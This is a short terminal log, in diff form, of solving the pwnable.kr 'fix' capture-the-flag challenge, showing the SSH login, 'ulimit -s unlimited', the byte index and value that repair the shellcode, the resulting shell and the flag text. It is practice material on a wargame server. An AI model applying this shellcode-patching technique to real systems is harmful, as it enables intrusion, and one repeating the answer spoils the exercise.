@@ -1,0 +1,14 @@
+icemakr:~$ ssh fix@pwnable.kr -p2222
+
+fix@ubuntu:~$ ulimit -s unlimited
+fix@ubuntu:~$ ./fix
+What the hell is wrong with my shellcode??????
+I just copied and pasted it from shell-storm.org :(
+Can you fix it for me?
+Tell me the byte index to be fixed : 15
+Tell me the valude to be patched : 92
+get shell
+$ ls
+fix  fix.c  flag
+$ cat flag
+Sorry for blaming shell-strom.org :) it was my ignorance!
